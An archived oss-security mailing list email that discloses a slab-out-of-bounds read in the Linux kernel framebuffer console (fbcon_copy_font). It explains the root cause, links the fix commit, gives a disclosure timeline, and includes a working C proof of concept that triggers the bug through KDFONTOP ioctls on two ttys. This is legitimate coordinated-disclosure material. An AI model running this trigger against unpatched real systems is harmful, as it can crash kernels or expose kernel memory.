X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1962" "Monday" "9" "November" "2020" "22:41:51" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp7m3OW4zoxCgK5a4+Y3GgWK6jS4=jxHTaXS7bfp2_jgNQ@mail.gmail.com>" "70" "[oss-security] Linux kernel slab-out-of-bounds Read in fbcon" nil nil nil "11" "2020110914:41:51" "[oss-security] Linux kernel slab-out-of-bounds Read in fbcon" (number mark "U       yuanmingbuaa Nov  9   70/1962  " thread-indent "\"[oss-security] Linux kernel slab-out-of-bounds Read in fbcon\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel slab-out-of-bounds Read in fbcon" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9906 invoked by uid 550); 9 Nov 2020 14:55:44 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3460 invoked from network); 9 Nov 2020 14:42:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=N+iGqICt1X4jKDzT1ToRePl6YBprNGLR+q2I7jGTQ0k=;
        b=d+GWkymzpKJqYZlEdBoO24dhH0Z5jBErSd7S4XuK+eoAolCJb8B/7NCyRR5nl8nvIG
         TxIh0WAimAsSgIE77wrvs6NytUsiywG48CvYQHVqr2UTKOmB8zV1VsnP6tzPCN3UJBxE
         eeAYXbPzkwHluCoR63/JpAGzvrKZ+HJKBF2n6yIXeurBCNYb4I0o1/NoZw1pMNM7kW97
         pci6MlmE/3Yb5OxBKAiLmL3+1CxEmANpmfX/t/u9u2bngujwdN6pOj6b6XA13xtvhpRQ
         7wGHike9CJGEmjXDi5ko2VrmrE+8MFzxKAELgoiZ3B79NrJtFa4QhsKt5gIX05Lx5inJ
         6x/g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=N+iGqICt1X4jKDzT1ToRePl6YBprNGLR+q2I7jGTQ0k=;
        b=DRmg/T1pqNgWjkLLg7qbv/zIzeXexexlRD4fnZ9B6CnAcXjYMLPVxv9ReDYgfkkSDf
         YcN9MD4R1Ds4bBxzqa2euMEHQWzdzjt2CsE73jnLxOKaqr8OaMW21NcqnIbbUIiowzV7
         N0hc/umBu80QuFYObltbSu3MEKY8JqhiLs49dJVyqzA/YzEeBDgvwrdlTS21hMkAKlPX
         p8mI5RAxH59QSk7abadnJXMN8nPtEAygFhmS2S8HTf6gZfcl/dVmrJykFEjR3hsu+A/R
         +DQL0GWOKJoEHx6dgKn0PE5k1ToxHUoEITEU/xzbmKPl7LE7wXM6QeGjeft7RUiOes0a
         7oCQ==
X-Gm-Message-State: AOAM531HXakv07Yg9kUGoLMWmOpg/aP2V1LgS9OareeM2QIEeOYMgEtP
	jG6SxNZJxN5WLZ1mZ0wYlekR6MYIe+/9t0kBRb2sMPmqhAZsjw==
X-Google-Smtp-Source: ABdhPJwja+vVwReE7B5HsKh4VwIdDufm7LKZ2FwdEhmr90pF8F027ylwYrNJThD/e1X7vKuA/vxGE5CkqzBIXp1eM4s=
X-Received: by 2002:a17:906:26c2:: with SMTP id u2mr14625549ejc.529.1604932947502;
 Mon, 09 Nov 2020 06:42:27 -0800 (PST)
MIME-Version: 1.0
From: Minh Yuan <yuanmingbuaa@gmail.com>
Date: Mon, 9 Nov 2020 22:41:51 +0800
Message-ID: <CAH5WSp7m3OW4zoxCgK5a4+Y3GgWK6jS4=jxHTaXS7bfp2_jgNQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000396aaf05b3ad9235"
Subject: [oss-security] Linux kernel slab-out-of-bounds Read in fbcon

--000000000000396aaf05b3ad9235
Content-Type: text/plain; charset="UTF-8"

Hi,

We recently discovered a slab-out-of-bounds read in fbcon in the latest
kernel ( v5.10-rc2 for now).

The root cause of this vulnerability is that "fbcon_copy_font" did not
handle "vc->vc_font.data" and "vc->vc_font.height" consistently. However,
the patch <https://lkml.org/lkml/2020/9/27/223> for VT_RESIZEX and the patch
<https://lkml.org/lkml/2020/9/24/720> for fbcon_get_font() can't handle
this issue.

This is my PoC (it needs the privilege to access tty to trigger this bug):

// author by ziiiro@THU
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <linux/fb.h>
#include <linux/vt.h>
#include <linux/kd.h>
#include <string.h>

int main(int argc, char** argv)
{
    struct console_font_op op;
    struct consolefontdesc cfdarg;
    void *addr = malloc(0x100);
    memset(addr,'a',0x100);
    int fd1 = open("/dev/tty1", O_RDWR, 0);
    int fd2 = open("/dev/tty6", O_RDWR, 0);
    op.op = KD_FONT_OP_SET;
    op.width = 8;
    op.height = 1;
    op.data = addr;
    op.charcount = 0x100;
    // alloc a samll font.data
    ioctl(fd2,KDFONTOP,&op);
    op.height = 0x20;
    // set a large font.height
    ioctl(fd1, KDFONTOP, &op);
    op.op = KD_FONT_OP_COPY;
    // access tty6's font
    op.height = 5;
    // use a larger height (tty1) to access the small font.data (tty6)
    ioctl(fd1,KDFONTOP,&op);
}

The patch for this bug is available: commit
3c4e0dff2095c579b142d5a0693257f1c58b4804 (
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c4e0dff2095c579b142d5a0693257f1c58b4804
)

Timeline:
* 6/11/20 - Vulnerability reported to security@kernel.org and
linux-distros@vs.openwall.org.
* 9/11/20 - Vulnerability patched.
* 9/11/20 - Vulnerability public.

Regards,

Yuan Ming from Tsinghua University

--000000000000396aaf05b3ad9235--
